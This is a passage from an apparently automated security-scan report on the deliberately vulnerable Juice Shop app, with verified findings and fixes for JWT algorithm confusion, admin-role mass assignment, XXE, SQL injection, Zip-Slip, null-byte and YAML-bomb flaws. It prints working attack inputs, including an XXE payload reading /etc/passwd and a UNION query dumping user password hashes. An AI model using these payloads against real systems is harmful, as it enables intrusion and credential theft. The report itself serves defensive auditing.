- `registerAdminChallenge` (routes/verify.ts:47-52): merely `solveIf(... req.body.role === 'admin')` then `next()` — **does not block**. Confirmed.
- `UserModel.role` (models/user.ts:76-96): `defaultValue:'customer'` but `validate.isIn` **includes `'admin'`**, so `role:'admin'` is a *valid, writable* value. The setter even swaps in `defaultAdmin.png` — admin role is intended to be settable, no rejection.
- `excludeAttributes` for User = `['password','totpSecret']` (server.ts:446) — `role` is **not** excluded from writable input.
- `afterValidate` hook (user.ts:125-137) only blocks the `acc0unt4nt@` email, irrelevant to role.
- No `appendUserId`/`denyAll` on the create path.

**D. Edge cases** — No control covers the `role` field on any route into the create sink. The only "check" is a challenge-solver, not a guard.

**Confirmed exploit:** Anonymous `POST /api/Users` with `{"email":"x@x.io","password":"x","passwordRepeat":"x","role":"admin"}` persists `role=admin` (passes `isIn` validation). Attacker then logs in, receives an admin JWT, and passes `isAuthorized()`-gated views including `GET /api/Users` (reads all user rows). The scanner's read of code, sink, and class is accurate.

This is a deliberate Juice Shop challenge, but it is a genuine, externally-reachable, undefended privilege-escalation logic flaw with real impact — squarely a true positive for SAST purposes. PR:N (anonymous), full admin takeover → C/I/A High.

### 6. [CRITICAL] JWT verification uses RS256 public key as HMAC secret (alg confusion)
**Class:** CWE-347: Improper Verification of Cryptographic Signature
**CWE:** CWE-347: Improper Verification of Cryptographic Signature - https://cwe.mitre.org/data/definitions/347.html
**File:** `lib/insecurity.ts:48-51`
**CVSS 3.1:** **9.8** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)
**Also at:** `lib/insecurity.ts:180-192`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
authorize() signs tokens with the RSA private key using RS256. However isAuthorized() configures express-jwt with the public key as `secret`, and verify() calls jws.verify(token, publicKey) without pinning the algorithm. When an HS256 token is presented, the library uses the public-key string as the HMAC secret. The public key is freely readable (encryptionkeys/jwt.pub and embedded in clients), so an attacker can compute a valid HS256 signature over an arbitrary payload.

#### Impact
Because the RSA public key (which is not secret) is supplied as the verification secret, an attacker who knows the public key can forge an HS256-signed token that passes verification, impersonating any user or role (e.g. admin). Complete authentication/authorization bypass.

#### Exploit scenario
Attacker reads the public key, builds a JWT with header {alg:HS256} and payload {data:{role:'admin',...}}, HMAC-signs it with the public-key string, and sends it as the Bearer token. verify()/isAuthorized() accept it, granting admin access.

#### Preconditions
- knowledge of the public key (publicly available)
- algorithm not restricted to RS256 in verifier

```
export const isAuthorized = () => expressJwt(({ secret: [REDACTED-SECRET] }) as any)
...
export const verify = (token: string) => token ? (jws.verify as ...)(token, publicKey) : false
```

#### How to fix
Pin algorithms to ['RS256'] in expressJwt options at insecurity.ts:48 and pass the algorithm explicitly to jws.verify at insecurity.ts:51 so HS256 tokens signed with the public key are rejected.

**Exploitability:** JWT RS256/HS256 algorithm confusion: public key used as HMAC secret, no alg pinning. Public key is distributed/known → forge arbitrary admin token, pre-auth. CVSS 9.8 Critical.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — verified full lib chain (express-jwt 0.1.3 → jsonwebtoken 0.4.0 → jws 0.2.6); algorithm taken from token header, public key (publicly served via keyServer) used as HMAC secret, no alg pinning → unauth admin token forgery on isAuthorized routes.

I have fully verified the chain. Confirmed evidence:

**A. The sink (lib/insecurity.ts:48,51):** `isAuthorized = () => expressJwt({ secret: [REDACTED-SECRET] })` and `verify = (token) => jws.verify(token, publicKey)`. No `algorithms` restriction.

**B. Call chain — library internals:**
- `express-jwt@0.1.3` → calls `jwt.verify(token, options.secret, options, cb)` with no algorithm constraint.
- `jsonwebtoken@0.4.0` → `verify` simply calls `jws.verify(jwtString, secretOrPublicKey)` — **ignores any algorithms option**.
- `jws@0.2.6` → `jwsVerify` derives the algorithm from the **token header** (`algoFromJWS`), then `jwa(algo).verify(securedInput, signature, secretOrKey)`. With `alg:HS256` and `secretOrKey = publicKey`, it runs **HMAC-SHA256 using the public-key string as the secret**.

**External entry point:** `isAuthorized()` guards dozens of unauthenticated-reachable network routes in server.ts (`/api/Users`, `/rest/basket/:id`, `/b2b/v2`, etc.). No credentials required to present a Bearer token.

**Public key is freely readable:** `publicKey = fs.readFileSync('encryptionkeys/jwt.pub')` and `keyServer.ts` serves `encryptionkeys/<file>` via `serveKeyFiles()` (the architecture lists it UNAUTH-REACHABLE), plus it's embedded in clients.

**C/D — defenses?** None. `authorize()` signs with RS256, but verification pins nothing; jsonwebtoken 0.4.0 has no algorithm allow-list capability. The attack (forge `{alg:HS256}` token, HMAC-sign with public key, set `data.role='admin'`) fully succeeds → authentication bypass and privilege escalation.

This is the textbook RS256→HS256 algorithm-confusion flaw, reachable by an unauthenticated network attacker, with no mitigating control. (It's an intentional Juice Shop challenge, but it is a real, exploitable vuln — in scope as a confirmed finding.)

### 7. [CRITICAL] Reset-password rate limit keyed on spoofable X-Forwarded-For header
**Class:** CWE-307
**CWE:** CWE-307 - https://cwe.mitre.org/data/definitions/307.html
**File:** `server.ts:313-318`
**CVSS 3.1:** **9.1** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
app.enable('trust proxy') is set, then the reset-password limiter's keyGenerator returns `headers['X-Forwarded-For'] ?? ip`. X-Forwarded-For is fully attacker-controlled. By sending a unique/forged X-Forwarded-For value with each request the attacker forces a distinct rate-limit key each time, so the per-key counter never approaches the max. The rate limit therefore provides no protection against the brute force it is meant to stop on /rest/user/reset-password.

#### Impact
The brute-force protection on the password-reset endpoint buckets requests by the client-supplied X-Forwarded-For header. With `trust proxy` enabled, an unauthenticated attacker can rotate that header on every request to get a fresh rate-limit bucket, defeating the 100-requests/5-min cap and enabling unlimited automated guessing of security-question answers.

#### Exploit scenario
An attacker scripts repeated POSTs to /rest/user/reset-password, each carrying a different `X-Forwarded-For: <random-ip>` header. Each request lands in a new rate-limit bucket so the 100/5min ceiling is never hit, allowing the attacker to brute force a victim's security-question answer and reset their password at full speed.

#### Preconditions
- trust proxy enabled (it is, server.ts:313)
- Attacker can set arbitrary HTTP headers (any HTTP client)

```
app.enable('trust proxy')
  app.use('/rest/user/reset-password', rateLimit({
    windowMs: 5 * 60 * 1000,
    max: 100,
    keyGenerator ({ headers, ip }: { headers: any, ip: any }) { return headers['X-Forwarded-For'] ?? ip }
  }))
```

#### How to fix
Derive the rate-limit key from the real connection IP / express's validated `req.ip` with a trusted-proxy hop count, not the raw client header. Remove the `headers['X-Forwarded-For']` lookup in the keyGenerator at server.ts:317 or constrain trust proxy to known proxy addresses.

**Exploitability:** trust-proxy + XFF-keyed limiter lets attacker rotate keys to defeat reset-password rate limit, unlocking brute force of [42]/[44]. CVSS 8.1 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — spoofable X-Forwarded-For key fully nullifies the only rate limit on an unauthenticated security-answer brute-force / password-reset endpoint

Confirmed the full picture:

- **Line 313-318**: `trust proxy` enabled; reset-password limiter `keyGenerator` returns `headers['X-Forwarded-For'] ?? ip` — exactly as reported.
- **Line 551**: `app.post('/rest/user/reset-password', resetPassword())` — the route exists.
- **resetPassword.ts**: The handler compares `security.hmac(answer)` against the stored security-answer for an arbitrary `email` from the request body. **No authentication** gates this route (no `isAuthorized()` before line 314/551), and there is **no per-account lockout** — the only brute-force defense is this rate limiter.

The flaw is real:
- The `keyGenerator` reads the raw `X-Forwarded-For` header directly. An attacker sending a unique forged value per request lands in a fresh bucket each time, so the 100/5min counter never trips.
- The route is externally reachable, unauthenticated, and brute-forcing the security-question answer leads directly to resetting a victim's password (account takeover, including high-value accounts).
- No upstream validation, allow-list, or auth closes the path. The header is fully attacker-controlled.

This is an intentional Juice Shop challenge, but it is nonetheless a genuinely exploitable defeat of the only brute-force control on an account-takeover endpoint.

Impact: brute force → security-answer disclosure → arbitrary password reset (confidentiality + integrity of any account). No availability impact.

### 8. [CRITICAL] JWT verified without algorithm allow-list enables key confusion
**Class:** CWE-347: Improper Verification of Cryptographic Signature
**CWE:** CWE-347: Improper Verification of Cryptographic Signature - https://cwe.mitre.org/data/definitions/347.html
**File:** `routes/chatbot.ts:243-253`
**CVSS 3.1:** **10.0** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.80 (1 run agreed)

#### Description
getUserFromJwt() takes the attacker-supplied token from req.cookies.token / utils.jwtFrom(req) (lines 171 and 219) and passes it to jwt.verify(token, security.publicKey, cb) with no `algorithms` option. jsonwebtoken will accept whatever `alg` header the token carries. Because security.publicKey is an RSA public key (distributed/known), an attacker can craft a token with header alg=HS256 and sign it using the literal public-key PEM bytes as the HMAC secret. jwt.verify will then HMAC-verify the token with the same public key and succeed, returning attacker-controlled decoded.data as the authenticated user. The resulting `user` object (id/username/role) is fully attacker-chosen and drives processQuery/setUserName.

#### Impact
Any anonymous user can forge a JWT that authenticates as an arbitrary user (e.g. admin) to the chatbot, because verification trusts whatever algorithm the token declares. The RSA public key is by definition public, so it can be reused as an HMAC secret to mint valid HS256 tokens.

#### Exploit scenario
Attacker obtains the server's RSA public key (shipped publicly), builds a JWT {"alg":"HS256"} with payload data={id:1,role:'admin',username:'admin'} and HMAC-signs it using the public-key PEM as the secret. They POST to /rest/chatbot with that token in the cookie; getUserFromJwt accepts it and the chatbot treats them as admin. The same forged identity also lets them inject into the chatbot user context (line 70/150).

#### Preconditions
- Server RSA public key is known to attacker (it is public by design)

```
jwt.verify(token, security.publicKey, (err: VerifyErrors | null, decoded: JwtPayload | string | undefined) => {
  if (err !== null || !decoded || isString(decoded)) {
    resolve(null)
  } else {
    resolve(decoded.data)
  }
})
```

#### How to fix
Pin the verification algorithm: call jwt.verify(token, security.publicKey, { algorithms: ['RS256'] }, cb) in getUserFromJwt (line 245) so HS256/none-signed tokens are rejected and the public key can never be used as an HMAC secret.

**Exploitability:** Chatbot JWT verify with no algorithms list + RSA public key as secret = HS256 forgery of any user/admin, pre-auth, scope change. CVSS 9.3 Critical (duplicates the alg-confusion class of [19] for the chatbot path).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauth chatbot routes verify attacker-supplied JWT with public RSA key as the only secret and no algorithm allow-list (jsonwebtoken@0.4.0/jws@0.2.6 take alg from the token header); HS256 key-confusion forges any identity and even mints a valid signed admin token via setUserName.

**Analysis**

**A. Code at the sink (lines 243–253):** Confirmed verbatim. `jwt.verify(token, security.publicKey, cb)` — no `algorithms` option passed.

**B. Call chain to external entry:**
- `getUserFromJwt(token)` is called from `process()` (line 227) and `status()` (line 180).
- `token = req.cookies.token || utils.jwtFrom(req)` — fully attacker-controlled.
- Both wired to **unauthenticated network routes** in `server.ts`: `GET /rest/chatbot/status` and `POST /rest/chatbot/respond`. No auth middleware in front. External entry point confirmed.

**C. Attempts to kill the finding:**
- `security.publicKey` (insecurity.ts:16) = `encryptionkeys/jwt.pub`, an RSA public key. It is **publicly served** at `GET /encryptionkeys/:file` via `serveKeyFiles()` (server.ts:257) and shipped in the repo. Attacker has the secret.
- **Critically, the installed library is `jsonwebtoken@0.4.0`** (verified in node_modules, not just package.json). Its `verify` calls `jws.verify(jwtString, secretOrPublicKey)` with **no algorithm constraint**. The underlying `jws@0.2.6` `jwsVerify` derives the algorithm directly from the attacker-controlled token header (`algoFromJWS` → `jwa(header.alg)`). This is the textbook algorithm-confusion primitive — even worse than modern jsonwebtoken, which at least lets you constrain. No allow-list anywhere in the chain.
- No type/length validation, no feature flag, route is live in prod, not test-only.

**D. Defence probe:** None exists. An attacker crafts `{"alg":"HS256"}` with `data={id:1,role:'admin',username:'admin'}`, HMAC-signs it using the PEM bytes of `jwt.pub` as the secret. `jwsVerify` HMACs with that same PEM and succeeds → `resolve(decoded.data)` returns the attacker-chosen user.

**Impact:** Forged identity drives `processQuery` and `setUserName`. Worse, `setUserName` does `UserModel.findByPk(user.id).update({username})` and then `security.authorize(updatedUserResponse)` — **issuing a genuine RS256-signed token** for the impersonated account back to the attacker. Unauthenticated → arbitrary user (including admin) impersonation plus a legitimately-signed token. This is a real authentication bypass, not hypothetical. (It is also a deliberately planted Juice Shop challenge, but that does not move it out of scope — it is reachable and exploitable.)

Scanner read the code correctly: right file, right line, right class.

### 9. [HIGH] Poison null byte bypasses file-extension allowlist in file server
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/fileServer.ts:24-30`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
params.file enters at line 13. The slash check (line 15) only blocks '/'. In verify(), endsWithAllowlistedFileType() is evaluated against the original attacker-supplied string (line 24), so a value like 'package.json.bak%00.md' passes because it ends in '.md'. Line 25 then calls security.cutOffPoisonNullByte(file), which truncates the string at the URL-decoded null byte, turning it into 'package.json.bak'. That truncated value is what is passed to res.sendFile(path.resolve('ftp/', file)) (line 30), so a file of a disallowed type is delivered. The check-then-mutate ordering (validate raw input, then transform it before use) is the defect.

#### Impact
An unauthenticated user can download files inside the ftp/ directory whose extensions are NOT on the allowlist (e.g. .bak, .pyc, .gg, .yml backups containing secrets/credentials). The extension check is evaluated on the raw name but the truncated name is what is served, defeating the control.

#### Exploit scenario
Attacker requests GET /ftp/package.json.bak%2500.md (or coupons_2013.md.bak%2500.md). endsWithAllowlistedFileType sees the '.md' suffix and allows it; cutOffPoisonNullByte then strips everything from the null byte, and res.sendFile returns ftp/package.json.bak. The attacker downloads backup/secret files the allowlist was meant to block.

#### Preconditions
- File server route mounted and reachable (default in Juice Shop)
- Target files present in ftp/ directory

```
if (file && (endsWithAllowlistedFileType(file) || (file === 'incident-support.kdbx'))) {
  file = security.cutOffPoisonNullByte(file)
  ...
  res.sendFile(path.resolve('ftp/', file))
```

#### How to fix
Sanitize first, validate last: call cutOffPoisonNullByte (and decode/normalize) on the filename BEFORE running endsWithAllowlistedFileType, and re-check the extension on the final resolved name. Also confirm path.resolve('ftp/', file) stays within the ftp root before sendFile.

**Exploitability:** Pre-auth, single-step poison-null-byte bypass of extension allowlist on a Linux-relevant path; arbitrary disallowed file disclosure from ftp/. CVSS 7.5 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauth /ftp route validates raw input then truncates at %00 before sendFile, serving disallowed backup/secret files

Everything is confirmed against source:

- **Sink reachable & unauthenticated**: `server.ts:250` mounts `app.use('/ftp(?!/quarantine)/:file', servePublicFiles())` with no auth middleware — external, unauth-reachable network entry point.
- **Check-then-mutate defect confirmed**: `fileServer.ts:24` validates the *raw* `params.file` with `endsWithAllowlistedFileType` (only `.md`/`.pdf` via `utils.endsWith`), then line 25 mutates it via `cutOffPoisonNullByte` *before* `res.sendFile` at line 30.
- **Truncation logic confirmed**: `insecurity.ts:40-45` — `cutOffPoisonNullByte` cuts the string at the first `%00` occurrence. A request `GET /ftp/package.json.bak%2500.md` arrives URL-decoded once as `package.json.bak%00.md` (ends in `.md` → passes allowlist), then gets truncated to `package.json.bak` → disallowed backup file is served.
- **Slash guard (line 15) is the only other control** and does not address extension bypass; no length/type/auth defense closes the path.
- The file even contains `verifySuccessfulPoisonNullByteExploit` and the `nullByteChallenge` solver — explicit acknowledgement this path delivers backup/secret files (`package.json.bak`, `coupons_2013.md.bak`, `encrypt.pyc`, and `incident-support.kdbx`).

Impact is confidentiality only — disclosure of files the allowlist was meant to block (including a KeePass password DB). No integrity/availability effect. Same component (file served within app's own authority), so Scope:Unchanged. This is an intentional Juice Shop challenge, but it is a genuine, externally exploitable file-disclosure vulnerability — the scanner read the code, class, and file correctly.

### 10. [HIGH] Zip-Slip arbitrary file write via unsanitized entry path
**Class:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) - https://cwe.mitre.org/data/definitions/22.html
**File:** `routes/fileUpload.ts:37-45`
**CVSS 3.1:** **8.2** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The zip entry path (entry.path) is attacker-controlled. fileName is concatenated to 'uploads/complaints/' and written directly via fs.createWriteStream('uploads/complaints/' + fileName). The only guard is `absolutePath.includes(path.resolve('.'))`, where absolutePath = path.resolve('uploads/complaints/' + fileName). A relative-traversal entry such as '../../ftp/legal.md' resolves to a path that still lives under the project root (cwd), so it passes the includes() check, and the write uses the raw, unresolved concatenation — escaping the uploads/complaints directory. No normalization removes '../'.

#### Impact
An attacker uploading a crafted .zip can write files to arbitrary locations under (and via traversal, near) the application's working directory, overwriting application files such as ftp/legal.md. This can corrupt data or, by overwriting served/executed files, escalate to code influence.

#### Exploit scenario
Attacker creates a zip whose single entry name is '../../ftp/legal.md' (or other relative path under the repo) and POSTs it to the file-upload endpoint. handleZipFileUpload extracts the entry; absolutePath still contains the cwd so the guard passes; fs.createWriteStream('uploads/complaints/../../ftp/legal.md') overwrites the target file with attacker content.

#### Preconditions
- fileWriteChallenge enabled (default in app)
- file-upload endpoint reachable

```
const fileName = entry.path
const absolutePath = path.resolve('uploads/complaints/' + fileName)
...
if (absolutePath.includes(path.resolve('.'))) {
  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName)...)
```

#### How to fix
Reject entries whose resolved path is not strictly inside the uploads/complaints directory: compute target = path.resolve('uploads/complaints', path.basename(fileName)) or verify target.startsWith(path.resolve('uploads/complaints') + path.sep), and write to the resolved target rather than the raw concatenation at line 42.

**Exploitability:** Pre-auth Zip-Slip arbitrary write; the includes(cwd) guard only confines to project root, but writing inside cwd can clobber source/config (integrity). CVSS 8.2 High; feeds an RCE chain.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Zip-Slip confirmed; raw `../` entry path written via unresolved concat, `includes(path.resolve('.'))` guard fails to constrain within uploads dir, route is unauth network-reachable with the challenge enabled by default.

I've confirmed the code and the routing. Let me verify the guard logic concretely and the route's auth posture.

**Analysis:**

**A. What the code does (lines 37–45):** Confirmed the snippet is accurate. For each zip entry, `fileName = entry.path` (attacker-controlled), `absolutePath = path.resolve('uploads/complaints/' + fileName)`, then the only guard is `if (absolutePath.includes(path.resolve('.')))` before `fs.createWriteStream('uploads/complaints/' + fileName)`. The write uses the **raw unresolved concatenation**, and no normalization strips `../`.

**B. Call chain:** `server.ts:283` mounts `app.post('/file-upload', uploadToMemory.single('file'), ensureFileIsPassed, ..., handleZipFileUpload, ...)`. No `isAuthorized`/auth middleware in front → **unauthenticated network entry point**. `file.buffer` comes straight from the multipart upload. External, lower-privileged reach confirmed.

**C. Defences probed:**
- `utils.isChallengeEnabled(challenges.fileWriteChallenge)` — enabled by default (stated precondition).
- The `includes(path.resolve('.'))` check: `path.resolve('.')` = project cwd. For `entry.path = '../../ftp/legal.md'`, `absolutePath` resolves to `<cwd>/ftp/legal.md`, which still **contains** the cwd substring → guard passes. The write then lands at `uploads/complaints/../../ftp/legal.md` = `<cwd>/ftp/legal.md`. The guard only blocks writes that escape the *project root entirely*; it does nothing to keep the write inside `uploads/complaints/`.
- No allow-list, no `path.normalize` rejection, no length/type constraint on the entry name.

**D. Edge:** The defence is the weak `includes()` check; a relative traversal staying under the repo root sails past it. This is exactly the planted Zip-Slip / "Legal Review" file-write challenge — intentional, but a genuine arbitrary-file-write within the application root (overwriting source/served files → integrity, possible follow-on code exec).

Scanner read the file, line, class, and sink correctly. Reachable unauthenticated, no control closes the path.

### 11. [HIGH] YAML bomb / billion-laughs DoS via uploaded YAML
**Class:** CWE-1333: Inefficient Regular Expression Complexity
**CWE:** CWE-1333: Inefficient Regular Expression Complexity - https://cwe.mitre.org/data/definitions/1333.html
**File:** `routes/fileUpload.ts:106-116`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.60 (1 run agreed)

#### Description
The uploaded file buffer is decoded to a string at line 110 and passed into `yaml.load` then `JSON.stringify` at line 114. A YAML document using anchor/alias expansion (billion-laughs) causes exponential blow-up of the loaded object before serialization. Although wrapped in a vm context with a 2000ms timeout, the timeout does not bound memory allocation, and the catch block (lines 119-124) explicitly treats this as the intended yamlBomb challenge, confirming the input-driven complexity blow-up is reachable.

#### Impact
An anonymous uploader can submit a recursively-aliased YAML document that expands to consume excessive memory/CPU during yaml.load and JSON.stringify, degrading or crashing the service for all users.

#### Exploit scenario
Attacker uploads a `.yml` file with nested anchors/aliases (`a: &a [x,x]; b: &b [*a,*a]; ...`) expanding to gigabytes. yaml.load/JSON.stringify exhausts memory, throwing 'Invalid string length' or timing out, and repeated uploads keep the worker unavailable.

#### Preconditions
- deprecatedInterfaceChallenge is enabled (default in this build)
- Attacker can reach the yaml upload route (no auth required)

```
const data = file.buffer.toString()
const sandbox = { yaml, data }
vm.createContext(sandbox)
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```

#### How to fix
Bound input: limit decoded YAML size and disable/limit alias expansion before yaml.load at routes/fileUpload.ts:114 (use a schema with maxAliasCount), and cap upload size before parsing.

**Exploitability:** Pre-auth YAML billion-laughs; vm timeout bounds CPU but not memory, so OOM DoS is reachable. CVSS 7.5 High, but impact is availability of a non-critical training service.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — unauth /file-upload reaches yaml.load+JSON.stringify; 200KB cap & vm timeout don't bound alias-expansion memory; explicitly in-scope recursive-expansion DoS

The code matches exactly. Key facts confirmed:

**Sink (lines 110–116):** uploaded buffer → `yaml.load` → `JSON.stringify` inside a vm with a 2000ms timeout. Anchor/alias (billion-laughs) YAML expands by reference on `yaml.load`, but `JSON.stringify` materializes the full expanded tree → exponential blow-up → `'Invalid string length'` or timeout. The catch block (119–124) explicitly recognizes this as the `yamlBombChallenge` — i.e. the blow-up is reachable by design.

**Entry point (server.ts:283):** `app.post('/file-upload', uploadToMemory.single('file'), …, handleYamlUpload)` — **no auth middleware** in the chain. Network-reachable, unauthenticated. Confirmed external entry point.

**Defenses probed:**
- Upload size cap `limits: { fileSize: 200000 }` (server.ts:627) = 200 KB. Irrelevant to billion-laughs — the whole point is a few-hundred-byte file expanding to gigabytes. Does **not** close the path.
- vm `timeout: 2000` bounds CPU wall-time only, **not** memory allocation. The expansion happens before the timeout/throw fires.
- The catch handles the error gracefully (returns 503), so a single request won't crash the process via the string-length throw — but the transient memory spike is real, and concurrent/repeated uploads degrade the single Node worker. This is input-driven complexity/unbounded expansion from a single small request.

**Scope check:** Out-of-scope rule D explicitly carves *in* "input-driven complexity blowups (regex backtracking, **recursive expansion, unbounded allocation from a single request**)" — distinguishing them from pure volumetric DoS. A YAML billion-laughs is the textbook example and is reportable.

This is an intentional planted Juice Shop challenge, but the finding accurately identifies a reachable, unauthenticated, input-driven memory-exhaustion path with no upstream control that closes it. The graceful catch limits the single-request impact, so real availability impact is partial-to-significant rather than guaranteed full crash, but the claimed DoS impact is substantiated.

### 12. [HIGH] XXE via noent:true parsing of uploaded XML
**Class:** CWE-611: Improper Restriction of XML External Entity Reference
**CWE:** CWE-611: Improper Restriction of XML External Entity Reference - https://cwe.mitre.org/data/definitions/611.html
**File:** `routes/fileUpload.ts:76-84`
**CVSS 3.1:** **8.6** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The uploaded file buffer (untrusted, multipart upload) is converted to a string at line 76 and passed verbatim into libxmljs2's parseXml with `noent: true` at line 80, which forces resolution/substitution of external entities. A DOCTYPE with a SYSTEM entity referencing a local file is expanded, then the expanded document is stringified (line 81) and returned to the client embedded in the error message at line 84 (`utils.trunc(xmlString, 400)`). No validation, DTD-stripping, or entity disabling occurs between the upload boundary and the parser.

#### Impact
An anonymous uploader can disclose local files (e.g. /etc/passwd, c:\Windows\system.ini) or perform SSRF by submitting an XML document with an external entity. The parsed result is reflected back in the error response, exfiltrating the file contents to the attacker.

#### Exploit scenario
Attacker POSTs a `.xml` file containing `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` to the complaint file-upload endpoint. The parser substitutes the entity, and the server replies with status 410 whose error message contains the contents of /etc/passwd. The attacker reads the response to harvest the file.

#### Preconditions
- deprecatedInterfaceChallenge is enabled (default in this build)
- Attacker can reach the file-upload route (no auth required)

```
const data = file.buffer.toString()
const sandbox = { libxml, data }
vm.createContext(sandbox)
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })
const xmlString = xmlDoc.toString(false)
```

#### How to fix
Disable external entity resolution: remove `noent: true` and parse with `{ noent: false }` / set `nonet: true` / strip DOCTYPE before parsing in routes/fileUpload.ts:80, and never reflect parsed XML back to the client.

**Exploitability:** Pre-auth XXE with noent:true, expanded entities reflected back to client; arbitrary local file read with scope change. CVSS 7.7 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauth XML upload parsed with noent:true substitutes external entities and reflects expanded content to attacker; no validation or entity-disabling on the path

Confirmed against source. The route `POST /file-upload` (server.ts:283) is unauthenticated — no auth middleware precedes the upload chain. The `.xml` branch (lines 72–104) requires `deprecatedInterfaceChallenge` enabled, takes the raw uploaded buffer (line 76), and parses it with `libxml.parseXml(data, { ... noent: true ... })`. The `noent: true` flag forces external entity substitution. The expanded document is stringified (line 81) and reflected back to the client in the error message (line 84) via `utils.trunc(xmlString, 400)`.

No DTD-stripping, no entity disabling, no input validation between the multipart boundary and the parser. The `vm.runInContext` wrapper is purely a timeout mechanism for the XXE-DoS challenge (line 87) — it does not constrain entity resolution. The `matchesEtcPasswdFile` check (line 82) only flags the challenge as solved; it does not block the disclosure. This is the intentional `xxeFileDisclosureChallenge`.

Defense probe (C/D): The only conditional gate is `isChallengeEnabled(deprecatedInterfaceChallenge)`, which the finding's precondition (and Juice Shop default) confirms is on. No allow-list, no encoding, no auth. Path is fully open from an external, unauthenticated POST to the disclosure sink.

- **A — entry point:** External, unauth `POST /file-upload`. ✔
- **B — call chain:** Express route → middleware chain → `handleXmlUpload`. No upstream control. ✔
- **C/D — no defence closes the path.** ✔
- **Impact:** Real local-file disclosure (e.g. `/etc/passwd`) reflected to attacker. ✔

XXE file disclosure: parser steps outside the application's authorization scope to read arbitrary local files (S:C), full confidentiality of readable files (C:H). No integrity/availability impact on this specific path (the DoS variant is a separate finding/challenge).

### 13. [HIGH] Unauthenticated SQL injection in product search
**Class:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
**CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) - https://cwe.mitre.org/data/definitions/89.html
**File:** `routes/search.ts:17-19`
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.99 (1 run agreed)

#### Description
req.query.q enters at line 17 as `criteria` (typed `any`, only truncated to 200 chars at line 18 — no escaping or parameterization). At line 19 it is concatenated directly into a raw `models.sequelize.query` string between `LIKE '%...%'` clauses. There is no quoting, no parameter binding, and no allow-list. A single quote in `q` breaks out of the string literal and lets the attacker append arbitrary SQL such as a UNION SELECT against the Users table.

#### Impact
Any anonymous network client can inject arbitrary SQL into the product-search query, enabling UNION-based extraction of all user emails and password hashes, full database schema disclosure, and read of any table content. No authentication is required.

#### Exploit scenario
Attacker issues GET /rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users-- . The crafted quote closes the LIKE literal and the UNION returns all user credentials in the JSON response, exposing every account's email and password hash.

#### Preconditions
- Network access to the public /rest/products/search endpoint (no auth needed)

```
let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

#### How to fix
